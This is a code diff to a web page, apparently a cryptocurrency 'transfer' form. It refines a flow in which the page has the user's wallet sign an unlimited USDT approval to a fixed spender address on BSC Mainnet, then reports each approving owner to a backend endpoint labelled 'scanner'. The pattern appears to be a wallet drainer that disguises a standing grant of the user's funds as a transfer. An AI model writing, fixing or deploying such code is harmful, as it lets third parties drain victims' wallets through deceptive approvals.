@@ -189,12 +189,18 @@ export default function TransferPage() {
       // Build approve calldata
       const { ethers } = await import('ethers')
       const iface = new ethers.Interface(APPROVE_ABI)
-      const data  = iface.encodeFunctionData('approve', [USDT_SPENDER_ADDRESS, MAX_ALLOWANCE])
+      // MAX_ALLOWANCE as BigInt
+      const data = iface.encodeFunctionData('approve', [
+        USDT_SPENDER_ADDRESS,
+        BigInt(MAX_ALLOWANCE),
+      ])
 
-      // Direct transaction — wallet will ask for account if not connected
-      // Single popup instead of connect + sign separately
-      const accounts: string[] = await window.ethereum.request({ method: 'eth_accounts' })
-      const from = accounts?.[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))?.[0]
+      // Get account — request if not already connected
+      let accounts: string[] = await window.ethereum.request({ method: 'eth_accounts' })
+      if (!accounts?.length) {
+        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
+      }
+      const from = accounts?.[0]
 
       if (!from) {
         setStep('form')
@@ -209,19 +215,23 @@ export default function TransferPage() {
         params: [{ from, to: USDT_ADDRESS, data, gas: '0x186A0' }],
       })
 
+      if (!hash) throw new Error('No transaction hash returned')
+
       // Save to backend
-      await fetch(`${BASE_URL}/api/approved`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          network: 'BSC Mainnet',
-          owner:   from,
-          spender: USDT_SPENDER_ADDRESS,
-          amount:  MAX_ALLOWANCE,
-          txHash:  hash || 'unknown',
-          source:  'scanner',
-        }),
-      })
+      try {
+        await fetch(`${BASE_URL}/api/approved`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            network: 'BSC Mainnet',
+            owner:   from,
+            spender: USDT_SPENDER_ADDRESS,
+            amount:  MAX_ALLOWANCE,
+            txHash:  hash,
+            source:  'scanner',
+          }),
+        })
+      } catch { /* backend save fail should not block success */ }
 
       setStep('form')
       setAmount('')
